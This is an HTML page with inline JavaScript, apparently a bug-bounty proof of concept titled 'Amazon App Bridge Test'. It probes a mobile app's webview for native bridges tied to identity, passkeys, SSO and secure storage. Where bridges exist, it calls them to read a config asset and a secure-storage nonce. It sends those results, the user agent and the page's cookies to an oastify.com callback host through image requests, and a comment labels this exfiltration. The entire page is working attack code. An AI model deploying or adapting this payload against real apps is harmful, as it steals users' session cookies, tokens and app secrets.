<!DOCTYPE html>
<html>
<head><title>Amazon App Bridge Test</title></head>
<body>
<script>
// Enumerate available JS bridges
var bridges = [
  'NativeInterface', 'AndroidInterface', 'smash', 'JSISecureStorage',
  'ReactNativeWebView', 'APPToBrowserSSOJSBridge', 'MAPAndroidJSBridge',
  'IDENTITY_MOBILE', 'FidoAuthenticatorJSBridge', 'IDENTITY_MOBILE_NAVIGATION',
  'IDENTITY_MOBILE_PHONE_NUMBER_PICKER', 'IDENTITY_MOBILE_PASSKEY'
];

var available = [];
for(var i = 0; i < bridges.length; i++) {
  if(window[bridges[i]]) {
    available.push(bridges[i]);
  }
}

// Exfiltrate via GET request (no CORS preflight)
var img = new Image();
img.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/bridges_found?data=' + 
           encodeURIComponent(JSON.stringify({bridges: available, userAgent: navigator.userAgent}));

// Test each bridge
if(window.NativeInterface) {
  var img2 = new Image();
  img2.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/native_interface_available';
  
  try {
    var result = NativeInterface.triggerJSEvent('{"useCase":"test","action":"probe"}');
    var img3 = new Image();
    img3.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/native_interface_result?data=' + 
               encodeURIComponent(JSON.stringify(result));
  } catch(e) {
    var img4 = new Image();
    img4.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/native_interface_error?error=' + 
               encodeURIComponent(e.toString());
  }
}

if(window.smash) {
  var img5 = new Image();
  img5.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/smash_available';
  
  try {
    var asset = smash.asset('config.json');
    var img6 = new Image();
    img6.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/smash_asset?data=' + 
               encodeURIComponent(asset.substring(0,1000));
  } catch(e) {
    var img7 = new Image();
    img7.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/smash_error?error=' + 
               encodeURIComponent(e.toString());
  }
}

if(window.JSISecureStorage) {
  var img8 = new Image();
  img8.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/jsi_available';
  
  try {
    var nonce = JSISecureStorage.getNonce();
    var img9 = new Image();
    img9.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/jsi_nonce?data=' + 
               encodeURIComponent(nonce);
  } catch(e) {
    var img10 = new Image();
    img10.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/jsi_error?error=' + 
                encodeURIComponent(e.toString());
  }
}

// Check for cookies
if(document.cookie) {
  var img11 = new Image();
  img11.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/cookies?data=' + 
              encodeURIComponent(document.cookie);
} else {
  var img12 = new Image();
  img12.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/no_cookies';
}
</script>
</body>
</html>
